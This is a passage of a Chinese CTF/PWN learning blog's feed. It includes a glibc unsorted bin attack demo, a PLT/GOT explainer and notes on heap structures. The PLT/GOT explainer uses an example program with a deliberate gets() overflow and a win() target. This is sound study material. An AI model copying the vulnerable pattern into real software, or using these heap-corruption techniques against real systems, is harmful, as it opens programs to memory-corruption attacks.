rewriting the "</span></span><br><span class="line">      <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">"Let's first look at the target we want to rewrite on stack:\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %ld\n\n"</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate first normal chunk on the heap at: %p\n"</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another normal chunk in order to avoid "</span></span><br><span class="line">                  <span class="string">"consolidating the top chunk with"</span></span><br><span class="line">                  <span class="string">"the first one during the free()\n\n"</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first chunk now and it will be inserted in the "</span></span><br><span class="line">                  <span class="string">"unsorted bin with its bk pointer "</span></span><br><span class="line">                  <span class="string">"point to %p\n"</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the "</span></span><br><span class="line">                  <span class="string">"victim-&gt;bk pointer\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And we write it with the target address-16 (in 32-bits "</span></span><br><span class="line">                  <span class="string">"machine, it should be target address-8):%p\n\n"</span>,</span><br><span class="line">          (<span class="keyword">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again to get the chunk we just free. During "</span></span><br><span class="line">                  <span class="string">"this time, target should has already been "</span></span><br><span class="line">                  <span class="string">"rewrite:\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%p: %p\n"</span>, &amp;target_var, (<span class="keyword">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222164945226.png" alt="image-20201222164945226"></p><p><img src="/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unsorted_bin_attack_order.png" alt="img"></p><p>经过上面原理的解释，这个就不说了</p><p>最后总结一句话:</p><p>修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;堆基础和堆漏洞还是分开比较好&lt;/p&gt;
&lt;p&gt;这样看着也比较整齐&lt;/p&gt;
&lt;h1 id=&quot;堆漏洞&quot;&gt;&lt;a href=&quot;#堆漏洞&quot; class=&quot;headerlink&quot; title=&quot;堆漏洞&quot;&gt;&lt;/a&gt;堆漏洞&lt;/h1&gt;&lt;h2 id=&quot;0x01-Off-By-One&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
    <category term="堆" scheme="https://pz1o.top/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>plt表和got表</title>
    <link href="https://pz1o.top/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/"/>
    <id>https://pz1o.top/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/</id>
    <published>2020-12-16T13:32:03.000Z</published>
    <updated>2020-12-17T01:05:53.222Z</updated>
    
    <content type="html"><![CDATA[<p>需要啥 学啥</p><p>看学长博客写了这个 自己也记录一下 毕竟刚学</p><p><a href="https://ld1ng.com/2020/06/16/GOTPLT/" target="_blank" rel="noopener">https://ld1ng.com/2020/06/16/GOTPLT/</a></p><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8" target="_blank" rel="noopener">https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p><p><a href="https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8" target="_blank" rel="noopener">https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p><h1 id="GOT表和PLT表"><a href="#GOT表和PLT表" class="headerlink" title="GOT表和PLT表"></a>GOT表和PLT表</h1><p>GOT（全局偏移表）和 PLT(过程链接表)，是两个表之间的交互才使得函数实现延迟绑定，通过这种方法将过程地址的绑定推迟到第一次调用该函数。</p><h1 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you win\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">gets(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"you lose\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这个文件</p><p>gdb调试一下</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216221001253.png" alt="image-20201216221001253"></p><p>此时我们可以看到<code>gets@plt</code>和<code>puts@plt</code>这两个函数</p><p>@plt这里的意思是指PLT表中的数据的地址。</p><blockquote><p>为了更好的用户体验和内存CPU的利用率，程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，PLT表可以称为内部函数表，GOT表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，可以理解为一定是一一对应的，</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123151558845" alt="这里写图片描述"></p></blockquote><p>这时 我们也就理解了@plt标志的函数，这个函数其实就是个过渡作用，因为GOT表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。</p><p>那@plt函数里面是什么呢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disass gets</span><br></pre></td></tr></table></figure><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216223010888.png" alt="image-20201216223010888"></p><blockquote><ol><li>jmp指令跳转到GOT表</li><li>GOT表中的数据为0x4004c6</li><li>跳转到指令地址为0x4004c6</li><li>执行<code>push 0x3</code>这个为在GOT中的下标序号</li><li>在执行<code>jmp 0x400480</code></li><li>而0x400480为PLT[0]的地址</li><li>PLT[0]的指令会进入动态链接器的入口</li><li>执行一个函数将真正的函数地址覆盖到GOT表中</li></ol></blockquote><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>1.<strong>PLT[0]处到底做了什么，按照我们之前的思路它不是应该跳转到GOT[0]吗</strong></p><p>这是plt[0]中的内容</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201217082532501.png" alt="image-20201217082532501"></p><p>后面的16进制就是GOT表中的内容</p><blockquote><p><strong>我们的PLT[0]根本没有跳转到GOT[0]，它不像我们的PLT[1]这些存储的是GOT表项的地址，它是一些代码指令，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。</strong></p></blockquote><p>所以我们可以得到下面这张图</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123155535419" alt="这里写图片描述"></p><p>而plt[0]代码做的事情则是：由于GOT[2]中存储的是动态链接器的入口地址，所以通过<strong>GOT[1]中的数据作为参数，跳转到GOT[2]所对应的函数入口地址，这个动态链接器会将一个函数的真正地址绑定到相应的GOT[x]中。</strong></p><p>总而言之，我们调用一个函数的时候有两种方法，一个是通过PLT表调用，一个则是通过GOT表调用，<strong>因为PLT表最终也是跳转GOT表，GOT表中则是一个函数真正的地址，这里需要注意的是，在一个函数没有运行一次之前，GOT表中的数据为@plt函数中下一条指令的地址。</strong></p><p>2.<strong>为什么中间要进行push压栈操作？</strong></p><p>中间进行的压栈是为了确定PLT对应的GOT表项，即是PLT[1]−&gt;GOT[3]，0x3就是GOT的下标3，也就是说压栈后我们跳转到PLT[0],接着PLT[0]中的指令会通过这次压栈的序号来确定操作的GOT表项为多少</p><p>3.<strong>压入的序号为什么为0x3，不是最开始应该为0x0吗？</strong></p><p>因为GOT[0],GOT[1],GOT[2]都有其他用处，所以从0x3开始。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="GOT表的构成"><a href="#GOT表的构成" class="headerlink" title="GOT表的构成"></a>GOT表的构成</h2><p>GOT[0]包含.dynamic段的地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息;</p><p>GOT[1]包含动态链接器的标识;</p><p>GOT[2]包含动态链接器的延迟绑定代码的入口点。</p><p>GOT的其他表目为本模块要引用的一个全局变量或函数的地址。</p><h2 id="PLT表的构成"><a href="#PLT表的构成" class="headerlink" title="PLT表的构成"></a>PLT表的构成</h2><p>PLT表并不是每个表项都用于存放“函数地址“，其中PLT[0]是一个特殊的表目，它跳转到动态链接器中执行，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>最后，自己总结一下实现过程</p><ol><li>首先，进入PLT表项，这时第一步就是跳转到GOT表项</li><li>GOT表项存放PLT表第二条指令的地址，也就是<code>push 0x x</code>把相应的idx压入</li><li>下一步就是跳转到PLT[0]中，进而链接到GOT[2] ,进入链接器入口</li><li>最后通过动态链接器将真正函数地址覆盖到GOT表中</li></ol><p>别人的动图</p><p><img src="/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20200208160601515.gif" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;需要啥 学啥&lt;/p&gt;
&lt;p&gt;看学长博客写了这个 自己也记录一下 毕竟刚学&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ld1ng.com/2020/06/16/GOTPLT/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ld1ng.c</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>堆</title>
    <link href="https://pz1o.top/2020/12/15/%E5%A0%86/"/>
    <id>https://pz1o.top/2020/12/15/%E5%A0%86/</id>
    <published>2020-12-15T08:19:22.000Z</published>
    <updated>2020-12-22T13:19:27.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆-持续更新"><a href="#堆-持续更新" class="headerlink" title="堆(持续更新)"></a>堆(持续更新)</h1><p><a href="https://ld1ng.com/2020/07/23/Heap/" target="_blank" rel="noopener">https://ld1ng.com/2020/07/23/Heap/</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap</a></p><p>上一个PWN学习 学得不太全面</p><p>写这个主要是为了自己能够全面复习堆的基础知识</p><p>由于我没学过操作系统 有些相关知识可能不太对 还请指正</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="0x01-什么是堆"><a href="#0x01-什么是堆" class="headerlink" title="0x01 什么是堆"></a>0x01 什么是堆</h3><ul><li>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存</li><li>堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长</li><li>我们一般成管理堆的那部分程序为堆管理器</li></ul><p>堆管理器处于用户程序与内核中间，主要做以下工作</p><ul><li>malloc</li><li>free</li></ul><h3 id="0x02-如何分配堆和释放堆"><a href="#0x02-如何分配堆和释放堆" class="headerlink" title="0x02 如何分配堆和释放堆"></a>0x02 如何分配堆和释放堆</h3><h4 id="1-malloc函数"><a href="#1-malloc函数" class="headerlink" title="1.malloc函数"></a>1.<strong>malloc函数</strong></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>该函数返回对应大小字节的内存块的指针</li><li>此外，该函数还对一些异常情况进行了处理</li><li>当n=0时，返回当前系统允许的堆的最小内存块</li><li><strong>当n为负数时，由于在大多数系统中，size_t是无符号数，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配</strong></li></ul><h4 id="2-free函数"><a href="#2-free函数" class="headerlink" title="2.free函数"></a>2.<strong>free函数</strong></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>该函数会释放由p所指向的内存块。这个内存块有可能是通过malloc函数得到的，也有可能是通过相关的函数realloc得到的</li></ul><p>该函数还对异常情况进行了一下处理</p><ul><li>当p为空指针时，函数不执行任何操作</li><li>当p已经被释放之后，再次释放会出现错误的效果，这其实就是double free</li><li>除了被禁用（mallocpt）的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便减小程序所使用的内存空间</li></ul><h3 id="0x03-如何实现堆"><a href="#0x03-如何实现堆" class="headerlink" title="0x03 如何实现堆"></a>0x03 如何实现堆</h3><ul><li>堆的glibc实现主要包括struct _heap_info，struct malloc_state，struct malloc_chunk这3个结构体</li></ul><h4 id="1-Arena"><a href="#1-Arena" class="headerlink" title="1.Arena"></a>1.Arena</h4><p><img src="/2020/12/15/%E5%A0%86/image-20201212002041969.png" alt="image-20201212002041969"></p><blockquote><ul><li>一个线程只有一个arnea，并且这些线程的arnea都是独立的不是相同的</li><li>主线程的arnea称为“main_arena”。子线程的arnea称为“thread_arena”</li></ul></blockquote><h5 id="Arena的数量及管理"><a href="#Arena的数量及管理" class="headerlink" title="Arena的数量及管理"></a>Arena的数量及管理</h5><p>我们说到有主线程和子线程的arena</p><p><strong>那么每个程序的arena的数量应该就是有限的</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">32</span>位系统中：</span><br><span class="line">     Number of arena = <span class="number">2</span> * number of cores + <span class="number">1.</span></span><br><span class="line"><span class="number">64</span>位系统中：</span><br><span class="line">     Number of arena = <span class="number">8</span> * number of cores + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这里就会涉及一个多线程共享问题</p><blockquote><p>eg：一个主Arena 两个副Arena</p><p>如果有一个4线程（大于3个Arena）的程序，显然这里就会出现一个共享问题</p><p><strong>此时glibc malloc会做以下操作：</strong></p><ul><li>首先，glibc malloc循环遍历所有可用的竞技场，在遍历的过程中，它会尝试锁该竞技场。如果成功锁（该竞技场当前对应的线程并未使用堆内存则表示可锁），那么该竞技场就可以被线程3所使用</li><li>而如果没能找到可用的舞台上，那么就将线程3的malloc的操作阻塞，直到有可用的舞台为止</li><li>当线程3的malloc阻塞解除时，glibc malloc就会先尝试使用最近访问的竞技场（此时为主竞技场）。如果此时主竞技场可用的话，就直接使用，否则就将线程3再次阻塞，直到主舞台上再次可用为止</li></ul></blockquote><h4 id="2-malloc-state"><a href="#2-malloc-state" class="headerlink" title="2.malloc_state"></a>2.<strong>malloc_state</strong></h4><ul><li>glibc的中arnea就是用这个结构体表示的</li><li>其中包含很多的信息：各种bins的信息，top chunk以及最后一个剩余chunk等</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>fastbinsY数组：</strong>存储的是该领域管理的fastbins</li><li><strong>bins数组：</strong>存储的是该领域管理的smallbins，unsortedbin，largebin</li><li><strong>binmap变量：</strong>系统查看有哪些垃圾箱链中有块时，不可能去fastbinsY和箱数组一个一个的遍历通过binmap变量，采用二进制存储，将二进制位与数组的索引相对，系统查找箱链时可以。通过按位与来查询，这样更高效。虽然unsigned int的二进制位比数组总元素少，但是系统不会有那么多的bin链，不需要考虑这个问题</li></ul></blockquote><h4 id="3-heap-info"><a href="#3-heap-info" class="headerlink" title="3.heap_info"></a>3.<strong>heap_info</strong></h4><ul><li>我们知道一个线程可以包含多个堆段，这些堆段同属于一个舞台来管理。每个堆段的信息就是用这个结构体来表示的</li><li><strong>注意：</strong>这个不是存储堆块的数据，而是来解释说明这个堆段的</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr;            <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span>  <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> <span class="built_in">size</span>;              <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size;     <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                             PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>ar_ptr：</strong>此堆段归属于哪一个arnea管理</li><li><strong>prev：</strong>前一个堆段</li></ul></blockquote><h4 id="4-malloc-chunk"><a href="#4-malloc-chunk" class="headerlink" title="4.malloc_chunk"></a>4.malloc_chunk</h4><ul><li>一个堆块被分为多个块，这些块就是用这些结构体表示的，这个才是我们在glibc的正真存储堆数据信息的结构体</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).*/</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead.*/</span></span><br><span class="line"> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>   <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line"> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><ul><li><p>每个成员都是8字节（64位系统中），4字节（32位系统中）</p></li><li><p><strong>mchunk_prev_size：</strong>只有当该chunk的物理相邻的前一地址chunk是空闲的话，该字段在本chunk中才有用，用来记录前一个chunk 的大小 (包括chunk头)。否则，该字段为0是没有用的；但是当前一个chunk申请的大小大于前一个chunk的大小时，那么该字段可以用来给前一个chunk使用（这就是chunk的空间复用，后面文章介绍）</p></li><li><strong>mchunk_size：</strong>当前chunk的大小，chunk大小都是8字节对齐</li></ul></blockquote><p>这里我们来看一下gdb调试的界面</p><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *p;</span><br><span class="line">        p = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *H;</span><br><span class="line">    H = <span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(H,<span class="string">"aaaaaaaaaaaaaaaa"</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">free</span>(H);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">gcc -o a.out a.c#<span class="number">64</span>位</span><br><span class="line">gcc -m32 -o b.out b.c#<span class="number">32</span>位</span><br></pre></td></tr></table></figure><p>64位</p><p><img 